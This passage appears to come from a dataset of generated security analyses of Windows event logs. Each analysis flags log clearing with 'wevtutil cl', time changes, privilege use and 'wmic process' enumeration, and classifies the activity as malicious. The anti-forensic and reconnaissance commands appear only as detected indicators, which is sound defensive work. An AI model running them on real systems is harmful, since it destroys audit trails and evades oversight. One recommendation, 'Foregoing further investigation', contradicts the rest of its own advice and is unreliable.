1. **Use of wevtutil.exe and System Log Deletion:**
   - Several instances of `wevtutil.exe` were executed by the user `SERVER002\admin_test` with high integrity. These instances involved clearing multiple event logs such as ""System,"" ""Security,"" ""Application,"" and ""Windows PowerShell."" 
   - The execution of `wevtutil.exe` with the `cl` command (which clears logs) can be indicative of log tampering and potentially an attempt to cover tracks after malicious activity. 
   
2. **Time Manipulation Detected:**
   - The logs show time adjustments on the machine, particularly with `svchost.exe` involved in changing system times. This action can be suspicious if it doesn't align with typical time synchronization behavior, possibly pointing to attempts to confuse or manipulate security logs.

3. **Use of Common Admin Tools:**
   - Utilities such as `cmd.exe`, `hostname.exe`, and `whoami.exe` were executed. These utility executions themselves are not inherently suspicious but given the context of log cleaning, they could be part of reconnaissance or gathering system information.

4. **High Privilege Actions:**
   - The user `admin_test` is seen acquiring very high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. at different intervals. While this might be standard for some administrative tasks, it could be misused for unauthorized actions or privilege escalation.

5. **Network Login from Remote Workstation:**
   - There were successful logon events from the workstation `DESKTOP-3HL5B2P` using NTLM authentication. Again, this could be routine, but depending on the context and policy, remote logins can be unusual.

### Assessment:

Given the evidence of:
- Log clearing using `wevtutil.exe`
- Time adjustments
- High-level privilege usage
- Potential remote access,
  
The activity seems unconventional and may represent an effort to obfuscate actions on the machine by clearing logs and manipulating timestamps. The combination of these actions suggests malicious intent.

### Recommendation: MALICIOUS

Based on the detailed examination of the logs, I would classify this activity as MALICIOUS, as it aligns with several techniques commonly used in post-compromise scenarios, such as clearing logs and executing administrative commands to hide activity. Immediate action should include:
- Conducting a full investigation into the activity of `SERVER002\admin_test`.
- Reviewing security policies related to remote access and privilege allocation.
- Performing a security audit and malware scan on `Server002`.
- Monitoring network traffic and logs for further anomalous or suspicious activity.
- Foregoing further investigation into the remote workstation `DESKTOP-3HL5B2P` for potential compromise signs."
Process Discovery - wmic process,"Upon reviewing the provided Windows event logs, several key events suggest anomalous and potentially malicious behavior.

### Suspicious Activities Identified:

1. **Event Logs Cleared:**
   - **Security Log (EventID 1102):** The event indicating that the security event log was cleared is typically a significant indicator of potential malicious activity. In this case, the user `admin_test` cleared the log at `2024-10-22 19:21:53`.
   - **System Log (EventID 104):** Logs within both the System and Windows PowerShell channels were cleared by the same user (`admin_test`), strongly suggesting an attempt to remove traces of activity.

2. **Use of `wevtutil.exe`:** 
   - The presence of multiple processes using `wevtutil.exe` with the command line arguments designed to clear logs confirms attempts to delete specific event logs on the system. This is illustrated by processes clearing the Application, System, Security, and Windows PowerShell logs using the `wevtutil cl` command.

3. **Time Change Events (EventID 4616):**
   - There are several events associated with time changes executed by `svchost.exe`. Time manipulation can be used to hinder log correlation and analysis, which may further support malicious intent.

4. **Execution of Administrative Commands:**
   - **cmd.exe** and **WMIC.exe**: The execution of commands like `wmic process get /format:list` can be leveraged for enumeration purposes. This can often be indicative of an attacker performing reconnaissance on the system.

5. **High Integrity Level with Administrative Context:**
   - All the suspicious activities, from clearing event logs to executing system enumeration commands, occur under a high integrity context. The user `admin_test` had administrative privileges, allowing for potentially unauthorized or malicious actions.

### Analysis and Conclusion:

The combination of administrative event log clearance, the use of Wevtutil to clear specific logs, and reconnaissance commands such as WMIC being executed under a high integrity level context point toward malicious activity. These behaviors are consistent with common attacker practices to conceal their footprint and gather system information.

### Resolution: MALICIOUS

Given the evidence of log manipulation, potential time-stamp tampering, and system enumeration, the logs indicate likely malicious activity. It's recommended to immediately conduct further investigation, isolate the affected host, and perform a detailed incident analysis. Enhance security monitoring and employ measures to prevent the recurrence of such events on the network. Additionally, reviewing system configurations for potential security gaps would be prudent."
